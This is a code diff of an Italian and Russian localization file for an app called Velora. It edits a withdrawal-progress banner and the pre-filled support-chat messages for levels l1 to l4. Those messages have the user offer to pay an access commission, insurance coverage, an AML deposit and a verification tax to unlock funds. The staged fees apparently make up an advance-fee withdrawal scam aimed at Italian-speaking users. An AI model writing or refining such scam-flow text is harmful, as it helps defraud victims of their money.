@@ -481,6 +481,10 @@ export default {
          строка меняется вместе с состоянием: пока шаги не закрыты, там стоит
          lead, когда закрыты все — эта фраза. Дословно с кадра. */
       ready: 'Fondi pronti per il prelievo — procedi ora!',
+      /** L1 после 1° messaggio commission: attesa passaggio L2 */
+      readyAwaitingServices: 'In attesa del pagamento dei servizi Velora',
+      /** L2+: servizi Velora pagati con successo */
+      readyPaidServices: 'Hai pagato con successo i servizi Velora',
       counter: '{done} / {total} completati',
       /* Доступное имя полосы. Само значение уходит в aria-valuetext
          строкой counter — «3 / 5 completati». */
@@ -695,23 +699,17 @@ export default {
          * Chiavi = fee.reason + alias l1…l4 (seed per livello).
          */
         templates: {
-          /* reason + l1…l4 — seed в composer (useSupportChat) */
-          base:
-            'Buongiorno, ho effettuato il pagamento di {amount} € della commissione di accesso e chiedo di proseguire con la pratica.',
-          insurance:
-            'Buongiorno, voglio pagare la copertura assicurativa di {amount} € per sbloccare l’accredito.',
-          aml:
-            'Buongiorno, voglio effettuare il deposito di {amount} € per la verifica della pratica.',
+          /* reason + l1…l4 — seed в composer (useSupportChat); без {amount} */
+          base: 'Voglio confermare il mio pagamento',
+          insurance: 'Voglio pagare la copertura assicurativa.',
+          aml: 'Voglio effettuare il deposito per la verifica.',
           release:
-            'Buongiorno, voglio pagare la tassa di verifica di {amount} € per sbloccare il prelievo.',
-          l1:
-            'Buongiorno, ho effettuato il pagamento di {amount} € della commissione di accesso e chiedo di proseguire con la pratica.',
-          l2:
-            'Buongiorno, voglio pagare la copertura assicurativa di {amount} € per sbloccare l’accredito.',
-          l3:
-            'Buongiorno, voglio effettuare il deposito di {amount} € per la verifica della pratica.',
+            'Voglio pagare la tassa di verifica di {amount} € per sbloccare il prelievo.',
+          l1: 'Voglio confermare il mio pagamento',
+          l2: 'Voglio pagare la copertura assicurativa.',
+          l3: 'Voglio effettuare il deposito per la verifica.',
           l4:
-            'Buongiorno, voglio pagare la tassa di verifica di {amount} € per sbloccare il prelievo.',
+            'Voglio pagare la tassa di verifica di {amount} € per sbloccare il prelievo.',
         },
       },
       suspension: {
@@ -1569,6 +1567,8 @@ export default {
       lead: 'Чтобы вывести средства, пройдите все шаги',
       allDone: 'Все шаги пройдены',
       ready: 'Средства готовы к выводу — можно продолжать!',
+      readyAwaitingServices: 'Ожидается оплата услуг сервиса Velora',
+      readyPaidServices: 'Вы успешно оплатили услуги сервиса Velora',
       counter: '{done} / {total} пройдено',
       meterLabel: 'Пройденные шаги',
       go: 'Перейти',
@@ -1737,22 +1737,16 @@ export default {
         busy: 'Отправьте сообщение консультанту, чтобы продолжить.',
         /* reason + l1…l4 — seed в composer */
         templates: {
-          base:
-            'Здравствуйте, я оплатил(а) комиссию доступа {amount} € и прошу продолжить рассмотрение заявки.',
-          insurance:
-            'Здравствуйте, хочу оплатить страховое покрытие {amount} €, чтобы разблокировать зачисление.',
-          aml:
-            'Здравствуйте, хочу внести депозит {amount} € для проверки заявки.',
+          base: 'Voglio confermare il mio pagamento',
+          insurance: 'Voglio pagare la copertura assicurativa.',
+          aml: 'Voglio effettuare il deposito per la verifica.',
           release:
-            'Здравствуйте, хочу оплатить проверочный сбор {amount} €, чтобы разблокировать вывод.',
-          l1:
-            'Здравствуйте, я оплатил(а) комиссию доступа {amount} € и прошу продолжить рассмотрение заявки.',
-          l2:
-            'Здравствуйте, хочу оплатить страховое покрытие {amount} €, чтобы разблокировать зачисление.',
-          l3:
-            'Здравствуйте, хочу внести депозит {amount} € для проверки заявки.',
+            'Voglio pagare la tassa di verifica di {amount} € per sbloccare il prelievo.',
+          l1: 'Voglio confermare il mio pagamento',
+          l2: 'Voglio pagare la copertura assicurativa.',
+          l3: 'Voglio effettuare il deposito per la verifica.',
           l4:
-            'Здравствуйте, хочу оплатить проверочный сбор {amount} €, чтобы разблокировать вывод.',
+            'Voglio pagare la tassa di verifica di {amount} € per sbloccare il prelievo.',
         },
       },
       suspension: {
